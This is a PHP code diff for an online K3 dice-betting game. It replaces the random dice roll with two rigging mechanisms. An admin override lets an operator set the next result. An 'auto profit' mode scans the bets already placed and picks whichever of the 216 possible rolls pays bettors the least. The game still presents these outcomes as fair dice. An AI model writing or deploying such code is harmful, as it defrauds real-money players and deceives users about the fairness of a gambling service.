@@ -65,10 +65,24 @@ function k3_generate_result($firebase, $typeId, $periodId) {
         return $existing;
     }
     
-    // Generate dice (1 to 6)
-    $d1 = rand(1, 6);
-    $d2 = rand(1, 6);
-    $d3 = rand(1, 6);
+    // Check for admin override
+    $override = $firebase->get('admin_overrides/k3_t' . $typeId);
+    if ($override != null && isset($override['d1']) && isset($override['d2']) && isset($override['d3']) && isset($override['active']) && $override['active'] == true) {
+        $d1 = (int)$override['d1'];
+        $d2 = (int)$override['d2'];
+        $d3 = (int)$override['d3'];
+        $firebase->update('admin_overrides/k3_t' . $typeId, ['active' => false]);
+    } else {
+        $bets = $firebase->get('game_bets/' . $fbTypeKey . '/' . $periodId);
+        $autoProfit = $firebase->get('system_settings/auto_profit_k3');
+        if (($autoProfit === true || $autoProfit === 'true' || $autoProfit === 1 || $autoProfit === '1') && $bets != null && is_array($bets) && count($bets) > 0) {
+            list($d1, $d2, $d3) = k3_calculate_house_optimal($bets);
+        } else {
+            $d1 = rand(1, 6);
+            $d2 = rand(1, 6);
+            $d3 = rand(1, 6);
+        }
+    }
     
     $sum = $d1 + $d2 + $d3;
     $gameType = k3_classify_dice($d1, $d2, $d3);
@@ -85,8 +99,10 @@ function k3_generate_result($firebase, $typeId, $periodId) {
     
     $firebase->set('game_results/' . $fbTypeKey . '/' . $periodId, $result);
     
-    // Settle bets (simple placeholder or simulation)
-    $bets = $firebase->get('game_bets/' . $fbTypeKey . '/' . $periodId);
+    // Settle bets
+    if (!isset($bets)) {
+        $bets = $firebase->get('game_bets/' . $fbTypeKey . '/' . $periodId);
+    }
     if ($bets != null && is_array($bets)) {
         k3_settle_bets($firebase, $typeId, $periodId, $sum, $gameType, $premium, $bets);
     }
@@ -304,5 +320,73 @@ function k3_ensure_recent_results($firebase, $typeId, $count = 10) {
     }
     
     return $results;
+}
+
+function k3_simulate_payout_for_roll($bets, $d1, $d2, $d3) {
+    $sum = $d1 + $d2 + $d3;
+    $premium = (string)($d1 . $d2 . $d3);
+    
+    $digits = str_split($premium);
+    sort($digits);
+    
+    $isAllSame = ($digits[0] === $digits[1] && $digits[1] === $digits[2]);
+    $isConsecutive = ($digits[0] + 1 == $digits[1] && $digits[1] + 1 == $digits[2]);
+    $isTwoSame = ($digits[0] === $digits[1] || $digits[1] === $digits[2]);
+    
+    $totalPayout = 0;
+    foreach ($bets as $bet) {
+        if (!isset($bet['selectType']) || !isset($bet['contractAmount']) || !isset($bet['gameType'])) continue;
+        $st = $bet['selectType'];
+        $gt = (string)$bet['gameType'];
+        $amt = (float)$bet['contractAmount'];
+        $won = false;
+        $multiplier = 1.0;
+        
+        if ($gt === '1') {
+            if (is_numeric($st) && (int)$st === $sum) {
+                $won = true;
+                $sumMultipliers = [
+                    3 => 207.36, 18 => 207.36,
+                    4 => 69.12, 17 => 69.12,
+                    5 => 34.56, 16 => 34.56,
+                    6 => 20.74, 15 => 20.74,
+                    7 => 13.83, 14 => 13.83,
+                    8 => 9.88,  13 => 9.88,
+                    9 => 8.3,   12 => 8.3,
+                    10 => 7.68, 11 => 7.68
+                ];
+                $multiplier = isset($sumMultipliers[$sum]) ? $sumMultipliers[$sum] : 1.92;
+            }
+        } elseif ($gt === '2') {
+            if ($st === 'H' && $sum >= 11) { $won = true; $multiplier = 1.92; }
+            elseif ($st === 'B' && $sum <= 10) { $won = true; $multiplier = 1.92; }
+        } elseif ($gt === '3') {
+            if ($st === 'S' && $sum % 2 !== 0) { $won = true; $multiplier = 1.92; }
+            elseif ($st === 'D' && $sum % 2 === 0) { $won = true; $multiplier = 1.92; }
+        }
+        
+        if ($won) {
+            $totalPayout += ($amt * $multiplier);
+        }
+    }
+    return $totalPayout;
+}
+
+function k3_calculate_house_optimal($bets) {
+    $minPayout = null;
+    $bestRoll = [1, 1, 1];
+    
+    for ($i1 = 1; $i1 <= 6; $i1++) {
+        for ($i2 = 1; $i2 <= 6; $i2++) {
+            for ($i3 = 1; $i3 <= 6; $i3++) {
+                $payout = k3_simulate_payout_for_roll($bets, $i1, $i2, $i3);
+                if ($minPayout === null || $payout < $minPayout) {
+                    $minPayout = $payout;
+                    $bestRoll = [$i1, $i2, $i3];
+                }
+            }
+        }
+    }
+    return $bestRoll;
 }
 ?>
